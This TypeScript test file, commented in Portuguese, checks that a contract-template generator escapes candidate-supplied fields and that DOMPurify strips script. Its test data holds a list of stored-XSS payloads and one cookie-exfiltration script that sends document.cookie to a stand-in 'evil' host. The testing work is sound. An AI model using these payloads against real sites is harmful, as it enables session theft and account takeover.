/**
 * Testes de regressão de segurança: sanitização e escape de payloads no
 * contrato gerado por contratacaoService.gerarTemplateContrato.
 *
 * Contexto:
 *  - admissoes é preenchido por candidatos via portal público (admissao_tokens),
 *    portanto TODO campo textual (nome, cpf, cargo, departamento, metadata) é
 *    considerado untrusted input armazenado.
 *  - O HTML retornado é injetado via dangerouslySetInnerHTML em ContratacaoPage
 *    após passar por DOMPurify.sanitize. Este arquivo garante duas camadas:
 *      1) O template escapa cada campo antes de concatenar (defesa em profundidade).
 *      2) DOMPurify.sanitize elimina qualquer script/handler que escape ao escape.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import DOMPurify from 'dompurify';
import { contratacaoService } from '../contratacaoService';
import { supabase } from '@/integrations/supabase/client';

vi.mock('@/integrations/supabase/client', () => ({
  supabase: { from: vi.fn() },
}));

// auditLogger é usado por outros métodos do service, mas não por
// gerarTemplateContrato. Mockamos para evitar side-effects em imports.
vi.mock('@/utils/auditLogger', () => ({
  auditLogger: { log: vi.fn().mockResolvedValue(undefined) },
}));

type MaliciousAdmissao = {
  id: string;
  nome: string;
  cpf: string;
  cargo: string;
  departamento: string;
  salario_proposto: number;
  data_prevista: string;
  metadata: Record<string, unknown> | null;
  empresa: Record<string, unknown>;
};

function mockAdmissaoRow(overrides: Partial<MaliciousAdmissao>): MaliciousAdmissao {
  return {
    id: '00000000-0000-0000-0000-000000000001',
    nome: 'Alice',
    cpf: '123.456.789-00',
    cargo: 'Analista',
    departamento: 'TI',
    salario_proposto: 5000,
    data_prevista: '2026-01-15',
    metadata: { endereco: 'Rua X, 123' },
    empresa: {
      razao_social: 'Empresa Segura Ltda',
      cnpj: '00.000.000/0001-00',
      logradouro: 'Av Principal',
      numero: '100',
      cidade: 'São Paulo',
      uf: 'SP',
    },
    ...overrides,
  };
}

function setupSupabaseMock(row: MaliciousAdmissao | null, error: unknown = null) {
  const maybeSingle = vi.fn().mockResolvedValue({ data: row, error });
  const eq = vi.fn(() => ({ maybeSingle }));
  const select = vi.fn(() => ({ eq }));
  (supabase.from as unknown as ReturnType<typeof vi.fn>).mockReturnValue({ select });
  return { maybeSingle, eq, select };
}

// Payloads clássicos de XSS armazenado, incluindo bypass comuns
const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '"><script>alert(1)</script>',
  '<img src=x onerror="alert(1)">',
  '<svg/onload=alert(1)>',
  "<iframe src='javascript:alert(1)'></iframe>',",
  '<a href="javascript:alert(1)">click</a>',
  '"><style>body{background:url("javascript:alert(1)")}</style>',
  '<body onload=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
];

describe('contratacaoService.gerarTemplateContrato — regressão XSS', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it.each(XSS_PAYLOADS)(
    'escapa payload malicioso em admissao.nome: %s',
    async (payload) => {
      setupSupabaseMock(mockAdmissaoRow({ nome: payload }));

      const html = await contratacaoService.gerarTemplateContrato('id-1');

      // 1) O payload literal NÃO deve aparecer executável no HTML
      expect(html).not.toContain(payload);
      // 2) Deve aparecer sua versão escapada (pelo menos '&lt;' quando começa com '<')
      if (payload.startsWith('<')) {
        expect(html).toContain('&lt;');
      }
      // 3) Nenhuma tag <script> executável
      expect(html.toLowerCase()).not.toMatch(/<script\b/);
      // 4) Nenhum handler on* injetado pelo payload
      // 4) Nenhum handler on* dentro de uma tag REAL (texto escapado é inofensivo)
      expect(html).not.toMatch(/<[a-z][^>]*\son\w+=/i);
    }
  );

  it('escapa payload em admissao.cargo e admissao.departamento', async () => {
    setupSupabaseMock(
      mockAdmissaoRow({
        cargo: '<img src=x onerror=alert(1)>',
        departamento: '</strong><script>alert(2)</script>',
      })
    );

    const html = await contratacaoService.gerarTemplateContrato('id-2');

    expect(html.toLowerCase()).not.toMatch(/<script\b/);
    expect(html).not.toMatch(/<[a-z][^>]*\sonerror=/i);
    // A quebra de tag </strong> tem que ser escapada — não pode fechar o <strong> real
    expect(html).toContain('&lt;/strong&gt;');
  });

  it('escapa payload dentro de metadata.endereco (input do candidato)', async () => {
    setupSupabaseMock(
      mockAdmissaoRow({
        metadata: { endereco: '<script>fetch("//evil?"+document.cookie)</script>' },
      })
    );

    const html = await contratacaoService.gerarTemplateContrato('id-3');

    expect(html).not.toContain('<script>fetch');
    expect(html).toContain('&lt;script&gt;fetch');
    expect(html.toLowerCase()).not.toMatch(/<script\b/);
  });

  it('não interpola literal do template mesmo com metadata ausente', async () => {
    // Regressão explícita do bug corrigido: `{(admissao.metadata as ...` estava
    // sendo emitido literalmente porque usava `{...}` em vez de `${...}`.
    setupSupabaseMock(mockAdmissaoRow({ metadata: null }));

    const html = await contratacaoService.gerarTemplateContrato('id-4');

    expect(html).not.toContain('admissao.metadata');
    expect(html).not.toContain('as Record<string');
    expect(html).toContain('Residência informada no cadastro');
  });

  it('propaga erro quando admissão não é encontrada (sem vazar HTML parcial)', async () => {
    setupSupabaseMock(null);
    await expect(contratacaoService.gerarTemplateContrato('inexistente')).rejects.toThrow(
      /não encontrada/i
    );
  });
});

describe('DOMPurify (defesa em profundidade da renderização) ', () => {
  beforeEach(() => { vi.clearAllMocks(); });

  it('mesmo que o template produzisse <script>, DOMPurify removeria', () => {
    const dirty = '<div><script>alert(1)</script><p>ok</p></div>';
    const clean = DOMPurify.sanitize(dirty, { ADD_ATTR: ['style'] });
    expect(clean.toLowerCase()).not.toContain('<script');
    expect(clean).toContain('<p>ok</p>');
  });

  it('preserva estilos inline usados no template do contrato', () => {
    const dirty = '<div style="color:#333">Contrato</div>';
    const clean = DOMPurify.sanitize(dirty, { ADD_ATTR: ['style'] });
    expect(clean).toContain('style=');
    expect(clean).toContain('Contrato');
  });

  it('remove handlers on* injetados via atributos', () => {
    const dirty = '<img src=x onerror="alert(1)">';
    const clean = DOMPurify.sanitize(dirty, { ADD_ATTR: ['style'] });
    expect(clean).not.toMatch(/<[a-z][^>]*\sonerror=/i);
  });

  it('remove URIs javascript: em <a href>', () => {
    const dirty = '<a href="javascript:alert(1)">x</a>';
    const clean = DOMPurify.sanitize(dirty, { ADD_ATTR: ['style'] });
    expect(clean.toLowerCase()).not.toContain('javascript:');
  });

  it('pipeline completo: template do serviço + sanitize continua seguro', async () => {
    setupSupabaseMock(
      mockAdmissaoRow({
        nome: '<img src=x onerror=alert(1)>Alice',
        cargo: '<script>alert(2)</script>Dev',
      })
    );
    const raw = await contratacaoService.gerarTemplateContrato('id-pipeline');
    const clean = DOMPurify.sanitize(raw, { ADD_ATTR: ['style'] });

    expect(clean.toLowerCase()).not.toContain('<script');
    expect(clean).not.toMatch(/<[a-z][^>]*\sonerror=/i);
    // Nome escapado continua legível no contrato
    expect(clean).toContain('Alice');
    expect(clean).toContain('Dev');
  });
});

function setupSupabaseMockForModule(row: MaliciousAdmissao | null) {
  return setupSupabaseMock(row);
}
// Evita warning de unused (utilitário reservado para futuros testes de fluxo).
void setupSupabaseMockForModule;
